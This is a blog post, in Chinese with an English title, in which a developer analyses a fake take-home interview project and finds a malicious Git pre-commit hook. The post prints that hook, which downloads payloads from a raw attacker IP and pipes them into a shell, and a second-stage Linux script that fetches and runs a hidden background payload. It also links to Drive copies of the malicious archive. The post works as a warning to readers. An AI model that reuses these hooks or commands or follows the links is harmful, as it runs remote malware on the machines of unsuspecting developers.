# Title: I Inspected My Take-Home Interview Project. It Was a Whole Operation  
标题：我检查了带回家的面试项目，结果发现是个完整行动  

---

我上周四通过 LinkedIn 私信收到一位招聘人员发来的 Python 开发职位。我很高兴有人直接联系我，于是请求更多细节。当他分享了职位描述、公司名称和预估薪资后，我想没什么损失。这是初始消息：提供每月 10,000 至 15,美元，用于远程优先的合同转正职位，这太好了。另外，为什么这家伙在我们见面之前就透露薪资信息？我以为招聘人员会玩“你先报价，我再跟进”的游戏。菜鸟错误。红旗立即开始挥舞。为什么预算这么高？（嗯，按印度远程职位标准算高，按美国标准不算离谱，但足以引人注目。）我查了公司，发现是 Y Combinator 的初创公司。YC 公司并不以传统运营著称，所以这并非完全不可能。但即便如此，如果一家公司有这么多钱可花，通常会有更结构化的招聘流程。我决定继续，但保持警惕。我发送了简历。招聘人员迅速批准，并通过 Google Drive 链接（包含一个 zip 压缩包和 PDF 说明）发送了带回家作业。这是原始云端硬盘链接：https://drive.google.com/drive/folders/18i1KDFXAPv7lqfBGddxj7IOnDy8J6VeH?usp=drive_link。我在这里制作了副本，以防他们删除自己的：https://drive.google.com/drive/folders/1DZYWezjpwolsxXnM5F04_Ng3nzTRYpVS?usp=sharing。评估 PDF 看起来意外地正规。内容是关于如何改进现有代码库、架构建议、一些 Git 操作等。我解压了 zip。乍一看，只是一个使用 SQLAlchemy 的样板 FastAPI 后端；非常标准。我检查了 requirements.txt 是否有明显的域名抢注或恶意包，但完全干净。有那么一瞬间，我以为我的怀疑毫无根据，这是个合法机会。这只是习惯（可能来自玩 CTF），每当我收到随机项目文件夹时，我就运行 `tree -a` 看看隐藏目录里有什么。但这次可能是我第一次在现实世界中因此获利。

等等。仓库中预配置了大量的 Git 钩子。我打开 pre-commit 脚本看看它们想运行什么。  
❯ cat .git/hooks/pre-commit  
#!/bin/sh  
case "$(uname -s)" in  
    Darwin*) curl -sL 'http://45.61.164.38:5777/task/mac?id=402' -L | sh > /dev/null 2>&1 & ;;  
    Linux*) wget -qO- 'http://45.61.164.38:5777/task/linux?id=402' -L | sh > /dev/null 2>&1 & ;;  
    MINGW*|MSYS*|CYGWIN*) curl -sL http://45.61.164.38:5777/task/windows?id=402 -L | cmd > /dev/null 2>&1 & ;;  
    *) curl -sL 'http://45.61.164.38:5777/task/mac?id=402' -L | sh > /dev/null 2>&1 & ;;  
esac  
中了。他们嵌入了一个脚本，检查受害者的主机操作系统并静默执行远程载荷。附注：为什么用原始 IP 地址？无论如何，这 screams “恶意软件”。至少注册一个像 lint-checker.com 或 jenkins-ci-runner.net 这样的诱饵域名。如果编写此载荷的攻击者正在阅读：各位请记笔记！让我们看看 Linux 载荷实际做了什么。注意传递给端点的 id=402 参数。记下来。  
❯ curl http://45.61.164.38:5777/task/linux?id=402  
#!/bin/bash  
set -e  
echo "Authenticated"  
TARGET_DIR="$HOME/Documents"  
clear  
wget -q -O "$TARGET_DIR/tokenlinux.npl" "http://45.61.164.38:5777/task/tokenlinux?id=402"  
clear  
mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"  
clear  
chmod +x "$TARGET_DIR/tokenlinux.sh"  
clear  
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &  
clear  
exit 0  
该脚本下载了一个最初名为 tokenlinux.npl 的二级载荷（我们稍后会回到这个特定扩展名）。然后将其隐藏在 ~/Documents 目录中，重命名为 tokenlinux.sh，使其可执行，并使用 nohup 在后台启动。根据 Google：nohup 命令（“no hang up”的缩写）是 Linux/Unix 实用程序，即使您注销、关闭终端或断开 SSH 会话，它也能保持进程运行。我们继续深入。让我们检查下一个脚本。
